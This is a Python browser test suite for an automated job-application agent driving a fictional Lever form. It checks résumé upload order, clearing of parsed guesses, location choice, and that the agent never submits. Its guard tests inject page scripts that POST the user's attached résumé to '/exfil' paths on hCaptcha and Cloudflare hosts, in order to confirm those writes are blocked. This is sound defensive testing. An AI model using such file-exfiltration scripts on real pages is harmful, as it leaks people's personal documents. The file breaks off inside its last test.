"""The Lever driver in a real Chromium, against FakeLever (skipped without Chromium, required in CI's `browser-python`).

Every test drives ``ApplyAgent`` with ``LeverAdapter`` through its own request policy (docs/phase5-lever-handoff-spec.md 10.4): pages are served by ``FakeLever``
through the agent's ``route_hook``, so ``route_decision`` runs first and only what it lets through reaches the fake. The fake records every request it received
and counts clicks on the controls an agent must never press (Submit, the page's hidden submit, the cookie banner, the inside of a challenge). Whatever a test is
about, ``go`` asserts the promise of this milestone afterwards: the agent pressed none of them, and no application POST reached the fake.

The driver is reachable only here: no production path starts a Lever browser run yet (tests/test_apply_lever_adapter.py proves it).
This file covers items 1 to 5, 8, 9 and 10 of spec 10.4 (the order of the résumé flow, the clearing of the reader's guesses, a run with the setting off, the
location, the guard, hCaptcha, the banner and the interstitial, and the page's own fields), the EEO and consent rules of 6.6, and a parse that does not finish
(item 12). Every company, person, posting and address is fictional.
"""

import dataclasses
import hashlib
import json
import sys
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from urllib.parse import urlparse
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))

import realdata_guard

realdata_guard.install()

import apply_fake_ats
import helpers_apply
from apply_fake_ats import LEVER_APPLY_URL, LEVER_COMPANY, FakeLever, lever_fixture_text, lever_parse_reply
from browser_support import requires_chromium
from helpers_apply import Store, entry

from opportunity_app.apply import agent as apply_agent
from opportunity_app.apply import ats as apply_ats
from opportunity_app.apply import lever
from opportunity_app.apply import policy as apply_policy
from opportunity_app.apply.agent import ApplyAgent
from opportunity_app.apply.agent_types import (
    HANDOFF_NOT_SUBMITTED, HANDOFF_UNPLANNED_FILE, HANDOFF_UNPLANNED_SEND, ApplyTimeouts, FilePayload,
)
from opportunity_app.apply.lever_adapter import LeverAdapter
from opportunity_app.apply.lever_form import parse_lever_form
from opportunity_app.apply.policy import build_plan

EMAIL = "sam.rivera@example.test"
PHONE = "555-0100"
LINKEDIN = "https://linkedin.example.test/in/sam-rivera"
GITHUB = "https://github.example.test/sam-rivera"
LOCATION = "Springfield, Example State, United States"
FACTS = {
    "name_parts": {"first": "Sam", "last": "Rivera", "preferred": "Sammy"},
    "contact": {"email": EMAIL, "phone": PHONE, "linkedin": LINKEDIN, "github": GITHUB},
}
RESUME_NAME = "Sam Rivera Resume.pdf"
RESUME_BYTES = b"%PDF-1.4\n% a fictional resume for the Lever driver's tests\n"
RESUME_SHA = hashlib.sha256(RESUME_BYTES).hexdigest()
COMPANIES = {
    "demo_eeo_survey.html": LEVER_COMPANY, "cards_files_consent.html": "Quillfeather Pets", "many_cards.html": "Orbital Ledger",
    "variants.html": "Tidewater Games", "two_required_groups.html": LEVER_COMPANY,
}
# Short waits: no settling, a lookup that has the 500 ms pause of the page and a good deal more, a window that closes after two seconds.
TIMEOUTS = ApplyTimeouts(
    settle_s=0, between_fields_s=0, choice_settle_s=3.0, navigation_s=15, fill_s=60, handoff_s=2.0, outcome_s=3, heartbeat_s=0.5, parse_s=5, person_s=6,
)
FORM_VALUES_JS = """() => Object.fromEntries(Array.from(document.getElementById('application-form').elements)
  .filter((e) => e.name && !['submit', 'button'].includes(e.type) && !(['checkbox', 'radio'].includes(e.type) && !e.checked))
  .map((e) => [e.name, e.type === 'file' ? (e.files[0] ? e.files[0].name : '') : e.value]))"""
# The tail the agent puts on a sentence once Lever has the file.
WITH_RESUME = "Your application was not sent. Lever received your résumé."


def resume_payload(data=RESUME_BYTES, name=RESUME_NAME):
    return FilePayload(name=name, mime_type="application/pdf", buffer=data, sha256=hashlib.sha256(data).hexdigest())


def lever_sources(*, upload=True, location=LOCATION, facts=None, resume_name=RESUME_NAME, **more):
    """What a value may come from for a Lever run. ``upload`` is the student's L1 choice (apply_lever_resume_upload)."""
    resume = dict(helpers_apply.RESUME_OK, sha256=RESUME_SHA, original_name=resume_name)
    src = helpers_apply.sources(facts=FACTS if facts is None else facts, labels={"location": location} if location else {}, resume=resume, **more)
    return dataclasses.replace(src, resume_upload=upload)


def schema_for(page):
    form = parse_lever_form(lever_fixture_text(page))
    assert form is not None, page
    return apply_ats.lever_parse_schema({"lever_form": form})


def planner(src, page):
    """The parent's side: the draft plan from the listing alone, and the plan the child gets back once it has read the page."""
    schema, company = schema_for(page), COMPANIES[page]

    def build(scan):
        fields = apply_policy.with_page_labels(schema, scan) if scan is not None else schema
        return build_plan(
            fields, scan, src, company, "handoff", ats_name="Lever", canonical_url=LEVER_APPLY_URL, adapter_version=lever.ADAPTER_VERSION, ats="lever",
        )

    return schema, build(None), lambda scan, uploads: build(scan)


def script(body):
    """A page script that runs as the page loads, wrapped so a throw in it is not an error of the test."""
    return "(function () { try { " + body + " } catch (error) { /* a refused request is the point */ } })();"


class LeverAgent(ApplyAgent):
    """An ``ApplyAgent`` for Lever's form that serves the fictional board, and notes what the page showed whenever the app acted on it."""

    def __init__(self, *, fake, **kwargs):
        super().__init__(route_hook=fake.route, headless=True, **kwargs)
        self.fake = fake
        self.acts = []            # (kind, key, what the page's reader showed, how many challenge frames were up, the keys acted on before)
        self.pressed = {}         # the fake's click counts, read as the window closes

    def _note(self, kind, key):
        try:
            shown, frames = self.adapter.parse_state(self._frame), FakeLever.challenge_frames(self._page)
        except Exception:  # noqa: BLE001 - a page that is going away
            shown, frames = "?", -1
        self.acts.append((kind, key, shown, frames, sorted(self._typed - {key})))

    def _type(self, locator, value, key, **more):
        self._note("type", key)
        return super()._type(locator, value, key, **more)

    def _tick(self, locator, key, checked=True):
        self._note("tick", key)
        return super()._tick(locator, key, checked)

    def _choose(self, locator, label, key):
        self._note("choose", key)
        return super()._choose(locator, label, key)

    def _attach(self, locator, payload, key):
        self._note("attach", key)
        return super()._attach(locator, payload, key)

    def _click(self, locator, purpose, key=""):
        self._note(f"click:{purpose}", key)
        return super()._click(locator, purpose, key)

    def keys(self, kind=None):
        return [key for what, key, *_ in self.acts if kind is None or what == kind]

    def _close_browser(self):
        try:
            self.pressed = FakeLever.clicks(self._page)
        except Exception:  # noqa: BLE001 - the page is gone
            pass
        return super()._close_browser()


@requires_chromium
class LeverCase(unittest.TestCase):
    def setUp(self):
        self.tempdir = tempfile.TemporaryDirectory()
        self.addCleanup(self.tempdir.cleanup)
        self.dir = Path(self.tempdir.name)

    def go(self, fake=None, *, page="demo_eeo_survey.html", src=None, files="default", student=None, timeouts=None, presses=0):
        """One handoff run against the fake. ``student(page, step, seen)`` plays the person in the window; ``seen`` is the form as the first tick of their turn saw it.

        ``presses`` is how many times that student is allowed to press Submit (the fake counts a student's press like any).
        """
        fake = fake or FakeLever(page=page)
        self.addCleanup(fake.drop_unanswered)
        src = src or lever_sources()
        schema, draft, replan = planner(src, page)
        files = {"resume": resume_payload()} if files == "default" else files
        steps, beats, seen = [], [], {}

        def hook(browser_page, step):
            if step == "handoff" and "form" not in seen:
                seen["form"] = browser_page.evaluate(FORM_VALUES_JS)
                seen["managed"] = LeverAdapter().page_managed(browser_page.main_frame)
                seen["clicks"] = FakeLever.clicks(browser_page)
            if step == "handoff":
                seen["frames"] = FakeLever.challenge_frames(browser_page)
            if student:
                student(browser_page, step, seen)

        agent = LeverAgent(
            fake=fake, mode="handoff", adapter=LeverAdapter(), run_id="run-test", screenshot_dir=self.dir, timeouts=timeouts or TIMEOUTS,
            on_progress=lambda step, text: steps.append(step), heartbeat=lambda: beats.append(1), student_hook=hook,
        )
        with agent:
            result = agent.run(draft, page_url=LEVER_APPLY_URL, schema=schema, files=files, replan=replan, hand_over=lambda: False)
        # The promise of this milestone, whatever the test was about: nothing the agent must never press was pressed, and no application POST reached the fake.
        self.assertEqual(agent.pressed.get("submit", 0) + agent.pressed.get("hiddenSubmit", 0), presses, "the agent pressed Submit")
        self.assertEqual(agent.pressed.get("cookie", 0), 0, "the agent pressed the cookie banner")
        self.assertEqual(agent.pressed.get("challenge", 0), 0, "the agent pressed inside a challenge")
        self.assertEqual(fake.apply_posts(), [], "an application POST reached the fake")
        return SimpleNamespace(result=result, fake=fake, agent=agent, steps=steps, beats=beats, seen=seen, plan=draft)

    @staticmethod
    def entries(run):
        return {item["key"]: item for item in run.result.plan}

    @staticmethod
    def left(run):
        return {item["key"]: item["reason"] for item in run.result.evidence["left_for_you"]}

    def refused(self, run, **match):
        return [item for item in run.result.refused if all(item.get(name) == value for name, value in match.items())]


# --- Item 1: the order ------------------------------------------------------------------------------------------------------

class OrderTests(LeverCase):
    def test_the_resume_is_attached_first_the_fill_waits_for_the_read_and_the_students_facts_end_up_in_the_form(self):
        fake = FakeLever()
        fake.parse_delay_s = 0.6    # "working" shows long enough that a fill started early would be caught
        run = self.go(fake)
        result = run.result
        self.assertEqual(result.outcome, "needs_you")
        self.assertEqual(result.reasons, [HANDOFF_NOT_SUBMITTED + " Lever received your résumé."])
        # The file went first: nothing but the file had been acted on when the page began to read it, and every later action found the page done.
        self.assertEqual(run.agent.acts[0][:2], ("attach", "resume"))
        self.assertEqual(run.agent.keys()[1], "name", "the first field after the file is the first planned one")
        self.assertTrue(all(shown == "success" for _kind, _key, shown, _frames, _before in run.agent.acts[1:]), run.agent.acts)
        self.assertEqual((result.evidence["resume_parse"], result.evidence["resume_stored"]), ("success", True))
        (post,) = fake.parse_posts()
        self.assertEqual((post.status, post.part("resume").sha256, post.part("resume").filename), (200, RESUME_SHA, "Sam_Rivera_Resume.pdf"))
        self.assertEqual(result.evidence["resume_sent_to_lever"], True)
        self.assertEqual(result.evidence["resume_post"], {"method": "POST", "host": "jobs.lever.co", "path": "/parseResume", "status": 200, "sha256": RESUME_SHA})
        self.assertNotIn(RESUME_NAME, json.dumps(result.evidence["resume_post"]))
        self.assertEqual(run.steps, ["open", "read", "fill", "check", "picture", "your_turn"])
        # The form holds the student's facts, not the reader's guesses.
        form = run.seen["form"]
        reply = lever_parse_reply()
        self.assertEqual((form["name"], form["email"], form["phone"]), ("Sam Rivera", EMAIL, PHONE))
        self.assertEqual((form["location"], json.loads(form["selectedLocation"])["name"]), (LOCATION, LOCATION))
        self.assertEqual((form["urls[LinkedIn]"], form["resume"]), (LINKEDIN, RESUME_NAME))
        everything = json.dumps(form)
        for guess in (reply["name"], reply["org"], reply["position"], reply["phone"], reply["email"], reply["location"]["name"]):
            self.assertNotIn(guess, everything)
        self.assertEqual(self.entries(run)["resume"]["disposition"], "fill")
        self.assertIn("resume", result.evidence["filled_keys"])

    def test_the_list_for_the_student_begins_with_what_was_sent_and_says_what_the_app_cleared(self):
        run = self.go()
        left = run.result.evidence["left_for_you"]
        self.assertEqual(left[0], {"key": "resume_sent", "question": "Your résumé", "reason": "Your résumé was sent to Lever when the app attached it."})
        self.assertIn("org", self.left(run), "a required company the app has no source for is the student's")

    def test_a_file_the_plan_does_not_match_is_never_attached_and_nothing_is_sent(self):
        run = self.go(files={"resume": resume_payload(b"%PDF-1.4 another file than the one confirmed")})
        self.assertEqual(run.fake.parse_posts(), [])
        self.assertEqual(run.result.evidence["resume_sent_to_lever"], False)
        self.assertEqual(self.entries(run)["resume"]["disposition"], "left_for_you")
        self.assertEqual(run.result.reasons, [HANDOFF_NOT_SUBMITTED])

    def test_a_page_that_reads_the_file_does_not_stop_the_run_that_reads_it_failing(self):
        run = self.go(FakeLever(parse_mode="failure"))
        self.assertEqual((run.result.evidence["resume_parse"], run.result.evidence["resume_stored"]), ("failure", False), "the page kept no id for a file it could not read")
        self.assertEqual(run.result.evidence["guesses_cleared"], [])
        self.assertEqual(run.seen["form"]["name"], "Sam Rivera")
        self.assertEqual((run.result.outcome, run.result.evidence["resume_sent_to_lever"]), ("needs_you", True))
        self.assertEqual(run.seen["form"]["org"], "")

    def test_a_page_that_reads_the_file_is_not_a_board_that_uploads_it_and_the_run_starts(self):
        # The same flag set the Greenhouse way (``uploads_on_attach``) ends a handoff before it fills anything (spec 10.4 item 16).
        run = self.go()
        self.assertEqual((run.result.evidence["page"], run.result.evidence["reads_on_attach"], run.result.evidence["uploads_on_attach"]), ("application_form", True, False))
        with mock.patch.object(LeverAdapter, "uploads_on_attach", lambda self, frame: True):
            refused = self.go()
        self.assertEqual(refused.result.reasons, [apply_agent.HANDOFF_S3])
        self.assertEqual(refused.agent.acts, [])
        self.assertEqual(refused.fake.parse_posts(), [])

    def test_a_file_over_the_pages_limit_is_not_sent_and_the_run_goes_on(self):
        fake = FakeLever()
        fake.max_upload_bytes = 8
        run = self.go(fake)
        self.assertEqual(run.fake.parse_posts(), [])
        self.assertEqual((run.result.evidence["resume_parse"], run.result.evidence["resume_sent_to_lever"]), ("oversize", False))
        self.assertEqual(run.result.reasons, [HANDOFF_NOT_SUBMITTED], "no file went to Lever, so the sentence is the plain one")


# --- Item 12: a read that does not finish ---------------------------------------------------------------------------------------

class ParseTimeoutTests(LeverCase):
    def test_a_read_that_never_finishes_stops_before_any_field_is_touched_with_the_window_closed_first(self):
        fake = FakeLever(parse_mode="timeout")
        run = self.go(fake, timeouts=dataclasses.replace(TIMEOUTS, parse_s=1.0))
        result = run.result
        self.assertEqual((result.outcome, result.after_click, result.handed_over), ("needs_you", False, False))
        self.assertEqual(result.reasons, ["Lever did not finish reading your résumé. Nothing was filled. Lever may still have the file."])
        self.assertEqual(run.agent.keys(), ["resume"], "nothing was touched after the file")
        self.assertEqual((result.evidence["resume_parse"], result.evidence["browser_closed"], result.evidence["handoff_end"]), ("timeout", True, "parse"))
        self.assertEqual(result.screenshots, [], "no picture is taken while a read is pending")
        self.assertEqual(self.entries(run)["name"]["disposition"], "blank")

    def test_a_reply_that_would_have_come_late_changes_nothing(self):
        fake = FakeLever(parse_mode="held")
        run = self.go(fake, timeouts=dataclasses.replace(TIMEOUTS, parse_s=1.0))
        self.assertEqual(run.result.outcome, "needs_you")
        self.assertEqual(run.agent.keys(), ["resume"])
        self.assertEqual(fake.release_held(), 1)
        self.assertEqual([seen.status for seen in fake.parse_posts()], [0], "the page was gone when the reply came")


# --- A read that has begun is waited for, whatever the app finds when it looks at the input afterwards ----------------------------------------

class ReadStartedTests(LeverCase):
    """The file is with Lever the moment it is attached (the page's change handler posts it). The app waits for the read to end before it touches
    anything, even when its own look at the input afterwards finds fault, and the reader's late reply never lands in the student's turn."""

    def ticks(self):
        forms = []

        def student(page, step, seen):
            if step == "handoff":
                forms.append(page.evaluate(FORM_VALUES_JS))

        return forms, student

    def assert_the_form_is_the_students(self, forms):
        self.assertTrue(forms, "the student's turn was never seen")
        reply = lever_parse_reply()
        for form in forms:
            self.assertEqual(form["org"], "", "the reader's guess is in the form during the student's turn")
            self.assertEqual(json.loads(form["selectedLocation"])["name"], LOCATION, "the hidden location is not the one the app chose")
            self.assertEqual(form["location"], LOCATION)
            self.assertNotIn(reply["org"], json.dumps(form))

    def test_a_file_name_the_page_shows_with_its_spaces_squeezed_is_still_the_file_and_nothing_is_touched_while_the_page_reads(self):
        fake = FakeLever()
        fake.parse_delay_s = 1.5     # "working" outlasts the whole fill, so an early fill leaves the reply to land in the student's turn
        forms, student = self.ticks()
        name = "Sam  Rivera Resume.pdf"
        run = self.go(fake, src=lever_sources(resume_name=name), files={"resume": resume_payload(name=name)}, student=student, timeouts=dataclasses.replace(TIMEOUTS, handoff_s=3.0))
        self.assertTrue(all(shown == "success" for _kind, _key, shown, _frames, _before in run.agent.acts[1:]), run.agent.acts)
        self.assertEqual(run.result.evidence["resume_parse"], "success")
        self.assertEqual(run.result.evidence["guesses_cleared"], ["org"])
        self.assertEqual(self.entries(run)["resume"]["disposition"], "fill")
        self.assert_the_form_is_the_students(forms)

    def test_a_hidden_location_that_stops_agreeing_with_the_visible_one_before_the_turn_stops_the_run(self):
        fake = FakeLever()
        # Something on the page rewrites the hidden field after the app has chosen the place, when the app clears the reader's guess in another field.
        fake.inject.append(script("""document.querySelector('[name="org"]').addEventListener('change', function () {
            document.querySelector('[name="selectedLocation"]').value = JSON.stringify({name: 'Guessville, Example State, United States', id: 'x'}); });"""))
        run = self.go(fake)
        self.assertEqual((run.result.outcome, run.result.after_click, run.result.handed_over), ("needs_you", False, False))
        self.assertEqual(run.result.reasons, ['The field "Current location" did not take the answer'])

    def test_a_check_of_the_input_that_fails_after_the_file_went_still_waits_for_the_read(self):
        fake = FakeLever()
        fake.parse_delay_s = 1.5
        # The page never shows the file's name inside the question, so the app cannot confirm what the input holds.
        fake.inject.append(script("""var label = document.querySelector('.visible-resume-upload .filename');
            new MutationObserver(function () { if (label.textContent) label.textContent = ''; }).observe(label, {childList: true, characterData: true, subtree: true});"""))
        forms, student = self.ticks()
        run = self.go(fake, student=student, timeouts=dataclasses.replace(TIMEOUTS, handoff_s=3.0))
        self.assertEqual(len(fake.parse_posts()), 1)
        self.assertEqual(run.agent.acts[1][:3], ("attach", "resume", "success"), "the input was only taken out again once the page had finished with the file")
        self.assertNotIn("working", [shown for _kind, _key, shown, _frames, _before in run.agent.acts], run.agent.acts)
        self.assertEqual((run.result.evidence["resume_parse"], run.result.evidence["resume_sent_to_lever"]), ("success", True))
        self.assertEqual(self.entries(run)["resume"]["disposition"], "left_for_you")
        self.assertEqual(self.left(run)["resume_sent"], "Your résumé was sent to Lever when the app attached it.")
        self.assert_the_form_is_the_students(forms)


# --- Item 2: the reader's guesses --------------------------------------------------------------------------------------------

class ClearingTests(LeverCase):
    def test_a_field_the_reader_filled_and_the_plan_has_no_source_for_is_cleared_read_back_empty_and_listed(self):
        run = self.go(src=lever_sources(location=None))
        form, left = run.seen["form"], self.left(run)
        reply = lever_parse_reply()
        for name in ("org", "location", "selectedLocation"):
            self.assertEqual(form[name], "", name)
        self.assertEqual((form["name"], form["email"], form["phone"]), ("Sam Rivera", EMAIL, PHONE), "what the plan fills is the student's")
        self.assertEqual(run.result.evidence["guesses_cleared"], ["location", "org"])
        for key in ("location", "org"):
            self.assertEqual(left[key], "Lever filled this from your résumé and the app did not have a confirmed value, so it cleared it", key)
        self.assertEqual(run.agent.keys("click:option_pick"), [], "no option was chosen without a confirmed label")
        self.assertNotIn(reply["org"], json.dumps(form))
        self.assertEqual(self.entries(run)["location"]["disposition"], "left_for_you")

    def test_the_reader_filled_links_the_plan_has_no_fact_for_are_cleared_and_the_ones_it_has_are_the_students(self):
        run = self.go(page="cards_files_consent.html", src=lever_sources(facts={**FACTS, "contact": {k: v for k, v in FACTS["contact"].items() if k != "github"}}))
        form = run.seen["form"]
        reply = lever_parse_reply()["urls"]
        self.assertEqual(form["urls[LinkedIn]"], LINKEDIN)
        for name in ("urls[Twitter]", "urls[GitHub]", "urls[Other]"):
            self.assertEqual(form[name], "", name)
        for guess in reply.values():
            self.assertNotIn(guess, json.dumps(form))
        self.assertEqual(run.result.evidence["guesses_cleared"], ["org", "urls[GitHub]", "urls[Other]", "urls[Twitter]"])

    def test_an_address_the_reader_filled_is_cleared_the_app_never_fills_a_home_address(self):
        run = self.go(page="variants.html")
        form = run.seen["form"]
        self.assertEqual((form["residentialLocation[street]"], form["residentialLocation[city]"]), ("", ""))
        self.assertTrue({"residentialLocation[street]", "residentialLocation[city]"} <= set(run.result.evidence["guesses_cleared"]))
        self.assertTrue({"residentialLocation[street]", "residentialLocation[city]"} <= set(self.left(run)))

    def test_the_students_own_value_is_never_cleared(self):
        run = self.go()
        self.assertNotIn("name", run.result.evidence["guesses_cleared"])
        self.assertNotIn("email", run.result.evidence["guesses_cleared"])
        self.assertNotIn("location", run.result.evidence["guesses_cleared"])

    def test_a_field_that_cannot_be_cleared_stops_the_run_and_says_which(self):
        fake = FakeLever()
        # A page that puts its own guess back whenever the field is emptied.
        fake.inject.append(script("""document.querySelector('[name="org"]').addEventListener('input', function (event) { event.target.value = 'Put back by the page'; });"""))
        run = self.go(fake)
        self.assertEqual((run.result.outcome, run.result.after_click), ("needs_you", False))
        self.assertEqual(run.result.reasons, ['The field "Current company" did not take the answer'])
        self.assertEqual(run.result.screenshots[-1]["step"], "needs-you")
        self.assertEqual(run.result.evidence["guesses_cleared"], [], "it was not cleared, so it is not said to have been")


# --- Item 3: the setting off -----------------------------------------------------------------------------------------------------

class SettingOffTests(LeverCase):
    def test_with_the_setting_off_nothing_but_gets_leave_the_page_and_the_resume_is_left_for_the_student(self):
        run = self.go(page="cards_files_consent.html", src=lever_sources(upload=False))   # (this board marks its résumé required: the list says so)
        result = run.result
        self.assertEqual(run.fake.non_get_requests(noise=False), [], "no write of any kind left the page")
        self.assertEqual(run.agent._state.resume_posts_passed, 0)
        self.assertEqual(result.reasons, [HANDOFF_NOT_SUBMITTED], "no file went to Lever, so the sentence is the plain one")
        self.assertEqual(self.entries(run)["resume"]["disposition"], "left_for_you")
        self.assertIn("Attach your résumé in the window", self.left(run)["resume"])
        self.assertNotIn("resume_sent", self.left(run))
        self.assertEqual((result.evidence["resume_sent_to_lever"], result.evidence["resume_post"], result.evidence["resume_parse"]), (False, None, ""))
        form = run.seen["form"]
        self.assertEqual((form["resume"], form["resumeStorageId"], form["name"], form["location"]), ("", "", "Sam Rivera", LOCATION))
        self.assertEqual(form["org"], "", "nothing was read, so nothing was filled in for it")
        self.assertEqual(result.evidence["guesses_cleared"], [])
        self.assertEqual(run.agent.keys("attach"), [])

    def test_with_the_setting_off_a_file_the_page_is_given_by_a_script_is_refused_and_recorded(self):
        fake = FakeLever()
        fake.inject.append(script("""var form = document.getElementById('application-form'), data = new FormData();
            data.append('resume', new Blob(['%PDF-1.4 x'], {type: 'application/pdf'}), 'cv.pdf'); data.append('accountId', form.querySelector('[name=accountId]').value);
            fetch('/parseResume', {method: 'POST', body: data});"""))
        run = self.go(fake, src=lever_sources(upload=False))
        self.assertEqual(fake.parse_posts(), [])
        self.assertEqual(len(self.refused(run, rule="resume_post_off")), 1)
        self.assertEqual(run.result.reasons, [HANDOFF_UNPLANNED_FILE])


# --- Item 4: the location ------------------------------------------------------------------------------------------------------------

class LocationTests(LeverCase):
    def test_the_option_whose_text_is_the_stored_label_is_chosen_never_the_first(self):
        places = [
            {"name": "Springfield, Another State, United States", "id": "fake-place-other"},
            {"name": "Springfield, Example State, United States", "id": "fake-place-springfield"},
            {"name": "Springfield, Example State, Canada", "id": "fake-place-canada"},
        ]
        with mock.patch.object(apply_fake_ats, "lever_search_options", return_value=places):
            run = self.go()
        form = run.seen["form"]
        self.assertEqual((form["location"], json.loads(form["selectedLocation"])), (LOCATION, places[1]))
        self.assertEqual(run.agent.keys("click:option_pick"), ["location"])
        (search,) = run.fake.search_gets()
        self.assertEqual(search.query, "text=Springfield", "the city part of the label, and nothing else")
        self.assertIn("location", run.result.evidence["filled_keys"])

    def test_the_location_is_typed_last_among_the_fields_and_by_real_key_presses(self):
        run = self.go()
        types = run.agent.keys("type")
        planned_text = ["name", "email", "phone", "urls[LinkedIn]", "urls[Github]"]
        self.assertTrue(all(types.index(key) < types.index("location") for key in planned_text), types)
        self.assertEqual(len(run.fake.search_gets()), 1, "one search, from the keystrokes: fill() starts none")

    def test_with_no_stored_label_the_field_is_left_empty_and_nothing_is_searched(self):
        run = self.go(src=lever_sources(location=None))
        self.assertEqual(run.fake.search_gets(), [])
        self.assertEqual((run.seen["form"]["location"], run.seen["form"]["selectedLocation"]), ("", ""))
        self.assertEqual(self.entries(run)["location"]["disposition"], "left_for_you")
        self.assertIn("location", self.left(run), "the reader's guess for it was cleared, and the list says why")

    def test_a_label_no_option_matches_exactly_is_never_half_typed_and_the_field_is_the_students(self):
        run = self.go(src=lever_sources(location="Springfield, Wrong State, United States"))
        form = run.seen["form"]
        self.assertEqual((form["location"], form["selectedLocation"]), ("", ""))
        self.assertEqual(len(run.fake.search_gets()), 1)
        self.assertEqual(run.agent.keys("click:option_pick"), [])
        self.assertIn("location", self.left(run))
        self.assertEqual(self.entries(run)["location"]["disposition"], "left_for_you")
        self.assertEqual(run.result.evidence["handoff_end"], "timeout", "the run went on to the student's turn")

    def test_a_lookup_the_page_cannot_make_leaves_the_field_empty_too(self):
        fake = FakeLever()
        fake.search_status = 403
        run = self.go(fake)
        self.assertEqual((run.seen["form"]["location"], run.seen["form"]["selectedLocation"]), ("", ""))
        self.assertIn("location", self.left(run))

    def test_a_list_that_offers_two_options_of_the_same_text_is_never_guessed_between(self):
        places = [{"name": LOCATION, "id": "fake-place-a"}, {"name": LOCATION, "id": "fake-place-b"}]
        with mock.patch.object(apply_fake_ats, "lever_search_options", return_value=places):
            run = self.go()
        self.assertEqual((run.seen["form"]["location"], run.seen["form"]["selectedLocation"]), ("", ""))
        self.assertEqual(run.agent.keys("click:option_pick"), [])


# --- Item 5: the guard ----------------------------------------------------------------------------------------------------------------

class GuardTests(LeverCase):
    ON_CHANGE = """var form = document.getElementById('application-form'), input = form.querySelector('input[name="resume"]');
        function post(blob, name) { var data = new FormData(); data.append('resume', blob, name); data.append('accountId', form.querySelector('[name=accountId]').value);
            return fetch('/parseResume', {method: 'POST', body: data}); }
        input.addEventListener('change', function () { %s });"""

    def test_a_resume_post_with_other_bytes_is_aborted_and_recorded_and_only_the_planned_file_reached_lever(self):
        fake = FakeLever()
        fake.inject.append(script(self.ON_CHANGE % "post(new Blob(['%PDF-1.4 other bytes'], {type: 'application/pdf'}), 'other.pdf');"))
        run = self.go(fake)
        self.assertEqual(len(self.refused(run, rule="resume_post_file")), 1)
        self.assertEqual([seen.part("resume").sha256 for seen in fake.parse_posts()], [RESUME_SHA])
        self.assertEqual(run.result.reasons, [HANDOFF_UNPLANNED_FILE.replace("Nothing was sent.", WITH_RESUME)])
        self.assertEqual(run.result.evidence["upload_refused"]["rule"], "resume_post_file")

    def test_a_second_resume_post_is_aborted_and_recorded(self):
        fake = FakeLever()
        fake.inject.append(script(self.ON_CHANGE % "setTimeout(function () { post(input.files[0], input.files[0].name); }, 150);"))
        run = self.go(fake)
        self.assertEqual(len(self.refused(run, rule="resume_post_second")), 1)
        self.assertEqual(len(fake.parse_posts()), 1)
        self.assertEqual(run.result.reasons, [HANDOFF_UNPLANNED_FILE.replace("Nothing was sent.", WITH_RESUME)])

    def test_the_attached_file_posted_to_a_place_the_fill_lets_writes_through_is_aborted_recorded_and_ends_the_run(self):
        # Cloudflare's path and the hCaptcha hosts take writes while the form is filled. The résumé is in the input by then, and a script can post it to either.
        for host, path in (("jobs.lever.co", "/cdn-cgi/challenge-platform/h/g/exfil"), ("hcaptcha.com", "/exfil"), ("api2.hcaptcha.com", "/exfil"), ("js.hcaptcha.com", "/exfil")):
            with self.subTest(host=host):
                fake = FakeLever()
                fake.inject.append(script(self.ON_CHANGE % (
                    "setTimeout(function () { var data = new FormData(); data.append('file', input.files[0], 'x.pdf'); "
                    f"fetch('https://{host}{path}', {{method: 'POST', body: data}}); }}, 50);")))
                run = self.go(fake)
                self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host=host)), 1, run.result.refused)
                self.assertEqual([seen for seen in fake.requests if seen.method == "POST" and seen.path == path], [], "the file reached the address")
                self.assertEqual([seen.part("resume").sha256 for seen in fake.parse_posts()], [RESUME_SHA])
                self.assertEqual(run.result.reasons, [HANDOFF_UNPLANNED_FILE.replace("Nothing was sent.", WITH_RESUME)])
                self.assertEqual(run.result.evidence["upload_refused"]["rule"], "upload_elsewhere")

    WRITE_ADDRESSES = (
        ("jobs.lever.co", "/cdn-cgi/challenge-platform/h/g/exfil"), ("hcaptcha.com", "/exfil"), ("api.hcaptcha.com", "/exfil"), ("api2.hcaptcha.com", "/exfil"),
        ("js.hcaptcha.com", "/exfil"),
    )

    def test_the_attached_file_as_the_raw_body_of_a_write_is_aborted_recorded_and_ends_the_run(self):
        # ``fetch(address, {method: 'POST', body: input.files[0]})`` is not a multipart body and not an octet stream: it is the file's own bytes under the file's own type.
        for host, path in self.WRITE_ADDRESSES:
            with self.subTest(host=host):
                fake = FakeLever()
                fake.inject.append(script(self.ON_CHANGE % (
                    f"setTimeout(function () {{ fetch('https://{host}{path}', {{method: 'POST', body: input.files[0]}}); }}, 50);")))
                run = self.go(fake)
                self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host=host)), 1, run.result.refused)
                self.assertEqual([seen for seen in fake.requests if seen.method == "POST" and seen.path == path], [], "the file reached the address")
                self.assertEqual([seen.part("resume").sha256 for seen in fake.parse_posts()], [RESUME_SHA])
                self.assertEqual(run.result.reasons, [HANDOFF_UNPLANNED_FILE.replace("Nothing was sent.", WITH_RESUME)])
                self.assertEqual(run.result.evidence["upload_refused"]["rule"], "upload_elsewhere")

    def test_the_attached_file_posted_in_the_students_turn_before_their_first_press_is_aborted_and_closes_the_window(self):
        # The file stays in the input for the student's turn, and a script on a timer can send it a moment after the fill. hCaptcha asks nothing of these addresses until the press.
        posts = {
            "a form with the file": "var data = new FormData(); data.append('file', input.files[0], 'x.pdf'); return fetch(%r, {method: 'POST', body: data});",
            "the raw file": "return fetch(%r, {method: 'POST', body: input.files[0]});",
        }
        for host, path in self.WRITE_ADDRESSES:
            for what, code in posts.items():
                with self.subTest(host=host, what=what):
                    fake = FakeLever()
                    sent = []

                    def student(page, step, seen, code=code, host=host, path=path):
                        if step == "handoff" and not sent:
                            sent.append(1)
                            page.evaluate("() => { var input = document.querySelector('#application-form input[name=resume]'); " + code % f"https://{host}{path}" + " }")

                    run = self.go(fake, student=student)
                    self.assertEqual(len(self.refused(run, rule="upload_elsewhere", host=host)), 1, run.result.refused)
                    self.assertEqual([seen for seen in fake.requests if seen.method == "POST" and seen.path == path], [], "the file reached the address")
                    self.assertEqual(run.result.evidence["handoff_end"], "upload", "the window was closed")
                    self.assertEqual([seen.part("resume").sha256 for seen in fake.parse_posts()], [RESUME_SHA])

    def test_a_post_to_any_other_path_is_aborted_and_recorded_before_anything_is_filled(self):
        fake = FakeLever()
        fake.inject.append(script("fetch('/collect', {method: 'POST', body: 'x=1', headers: {'Content-Type': 'application/x-www-form-urlencoded'}});"))
        run = self.go(fake)
